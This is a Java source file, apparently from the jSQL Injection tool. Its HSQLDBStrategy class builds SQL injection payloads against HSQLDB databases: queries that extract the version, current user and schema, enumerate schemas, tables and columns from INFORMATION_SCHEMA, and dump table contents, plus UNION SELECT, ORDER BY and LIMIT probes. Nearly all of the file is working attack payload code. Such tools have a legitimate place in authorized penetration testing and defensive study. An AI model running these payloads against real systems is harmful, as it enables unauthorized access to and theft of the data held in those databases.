package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class HSQLDBStrategy extends AbstractVendorStrategy {

    @Override
    public String getSchemaInfos() {
        return
            "select+concat(" +
                "" +
                    "concat_ws(" +
                        "'{%}'," +
                        "DATABASE_VERSION()," +
                        "CURRENT_SCHEMA," +
                        "USER()," +
                        "SYSTEM_USER" +
                    ")" +
                "" +
                "," +
                "'%01%03%03%07'" +
            ")r+FROM(VALUES(0))";
    }

    @Override
    public String getSchemaList() {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "r||" +
                        "'%05'||" +
                        "convert(q,SQL_VARCHAR)||" +
                        "'%04'" +
                        "+order+by+r+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")r+" +
            "from(" +
                "select+" +
                    "convert(TABLE_SCHEMA,SQL_VARCHAR)r," +
                    "count(TABLE_NAME)q+" +
                "from+" +
                    "INFORMATION_SCHEMA.tables+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getTableList(Database database) {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "convert(r,SQL_VARCHAR)||" +
                        "'%050%04'+" +
                        "order+by+r+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")r+" +
            "from(" +
                "select+" +
                    "TABLE_NAME+r+" +
                "from+" +
                    "information_schema.tables+" +
                "where+" +
                    "TABLE_SCHEMA='" + database + "'+" +
                "order+by+r{limit}" +
            ")x";
    }

    @Override
    public String getColumnList(Table table) {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "convert(n,SQL_VARCHAR)||" +
                        "'%05'||" +
                        "0||" +
                        "'%04'+" +
                        "order+by+n+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")r+" +
            "from(" +
                "select+" +
                    "COLUMN_NAME+n+" +
                "from+" +
                    "information_schema.columns+" +
                "where+" +
                    "TABLE_SCHEMA='" + table.getParent() + "'+" +
                    "and+" +
                    "TABLE_NAME='" + table + "'+" +
                "order+by+n{limit}" +
            ")x";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "{%}");
        
        // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
        formatListColumn = formatListColumn.replace("{%}", ",SQL_VARCHAR),'')),'%7f',trim(ifnull(convert(");
        
        formatListColumn = "trim(ifnull(convert(" + formatListColumn + ",SQL_VARCHAR),''))";
        
        return
            "select+concat(" +
                "group_concat(" +
                    "'%04'||" +
                    "r||" +
                    "'%05'||" +
                    "convert(q,SQL_VARCHAR)||" +
                    "'%04'" +
                    "+order+by+r+separator+'%06'" +
                ")," +
                "'%01%03%03%07'" +
            ")r+from(" +
                "select+" +
                    "convert(concat(" + formatListColumn + "),SQL_VARCHAR)r," +
                    "count(*)q+" +
                "from+" +
                    "" + database + "." + table + "+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return
            "select'SQLi'||substr(r," + startPosition + "," +
                /**
                 * Minus 'SQLi' should apply
                 */
                MediatorModel.model().normalStrategy.getPerformanceLength() +
            ")from(" + sqlQuery + ")x";
    }

    @Override
    public String getIndicesCapacity(String[] indexes) {
        return
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "('SQLi'||$1||repeat('%23',1024)||'iLQS')"
            );
    }

    @Override
    public String getIndices(Integer nbFields) {
        String replaceTag = "";
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select(1337"+ i +"7330%2b1)||''FROM(VALUES(0))";
        }
        return "+union+select" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "from(" + replaceTag + ")b+";
    }

    @Override
    public String getOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+limit+" + limitSQLResult + ",65536";
    }
}